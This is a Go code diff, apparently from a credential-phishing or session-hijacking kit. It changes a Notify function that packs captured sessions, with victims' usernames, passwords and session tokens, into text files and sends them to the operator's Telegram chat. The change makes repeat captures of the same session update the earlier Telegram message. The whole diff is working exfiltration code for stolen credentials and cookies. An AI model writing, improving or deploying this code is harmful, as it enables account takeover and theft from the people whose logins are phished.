@@ -73,6 +73,7 @@ func processAllTokens(sessionTokens, httpTokens, bodyTokens, customTokens string
 
 // Define a map to store session IDs and a mutex for thread-safe access
 var processedSessions = make(map[string]bool)
+var sessionMessageMap = make(map[string]int)
 var mu sync.Mutex
 
 func generateRandomString() string {
@@ -157,68 +158,64 @@ func formatSessionMessage(session Session) string {
 		session.UpdateTime,
 	)
 }
-
 func Notify(session Session) {
 	config, err := loadConfig()
 	if err != nil {
 		fmt.Println(err)
 		return
 	}
-	// duplication handling
+
 	mu.Lock()
+	// Check if the session is already processed
 	if processedSessions[string(session.ID)] {
-		// If the session ID is already processed, skip sending notifications
-		fmt.Printf("Skipping duplicate notification for SessionID: %s\n", string(session.ID))
+		// If duplicate, update the associated message with a new file
+		messageID, exists := sessionMessageMap[string(session.ID)]
 		mu.Unlock()
+
+		if exists {
+			txtFilePath, err := createTxtFile(session)
+			if err != nil {
+				fmt.Println("Error creating TXT file for update:", err)
+				return
+			}
+			err = updateMessageFile(config.TelegramChatID, config.TelegramToken, messageID, txtFilePath)
+			if err != nil {
+				fmt.Printf("Error updating message: %v\n", err)
+			}
+			os.Remove(txtFilePath)
+		} else {
+			fmt.Println("Message ID not found for session:", session.ID)
+		}
 		return
 	}
-	// Mark the session ID as processed
+
+	// Mark session as processed
 	processedSessions[string(session.ID)] = true
 	mu.Unlock()
 
-	// Format the session message
-	message := formatSessionMessage(session)
+	// Create the TXT file for the original message
 	txtFilePath, err := createTxtFile(session)
-
 	if err != nil {
-		fmt.Println("Error creating Txt file:", err)
+		fmt.Println("Error creating TXT file:", err)
 		return
 	}
 
-	fmt.Printf("------------------------------------------------------\n")
-	fmt.Printf("Latest Session:\n")
-	fmt.Printf(message)
-	fmt.Printf("------------------------------------------------------\n")
+	// Format the message
+	message := formatSessionMessage(session)
 
-	// Check if the username and password are not empty before sending the Telegram notification
-	if session.Username != "" && session.Password != "" {
-		// Send notifications based on config
-		if config.TelegramEnable {
-			sendTelegramNotification(config.TelegramChatID, config.TelegramToken, message, txtFilePath)
-			if err != nil {
-				fmt.Printf("Error sending Telegram notification: %v\n", err)
-			}
-		}
-	} else {
-		fmt.Println("Skipping Telegram notification: Username or Password is empty.")
-	}
-
-	if config.MailEnable {
-		err := sendMailNotificationWithAttachment(config.MailHost, config.MailPort, config.MailUser, config.MailPassword, config.ToMail, message, txtFilePath)
-		if err != nil {
-			fmt.Printf("Error sending Mail notification: %v\n", err)
-		}
-	}
-
-	if config.DiscordEnable {
-		sendDiscordNotification(config.DiscordChatID, config.DiscordToken, message, txtFilePath)
-	}
-
-	// After sending, delete the Txt file
-	err = os.Remove(txtFilePath)
+	// Send the notification and get the message ID
+	messageID, err := sendTelegramNotification(config.TelegramChatID, config.TelegramToken, message, txtFilePath)
 	if err != nil {
-		fmt.Printf("Error deleting Txt file: %v\n", err)
-	} else {
-		fmt.Println("Txt file deleted successfully.")
+		fmt.Printf("Error sending Telegram notification: %v\n", err)
+		os.Remove(txtFilePath)
+		return
 	}
+
+	// Map the session ID to the message ID
+	mu.Lock()
+	sessionMessageMap[string(session.ID)] = messageID
+	mu.Unlock()
+
+	// Remove the temporary TXT file
+	os.Remove(txtFilePath)
 }
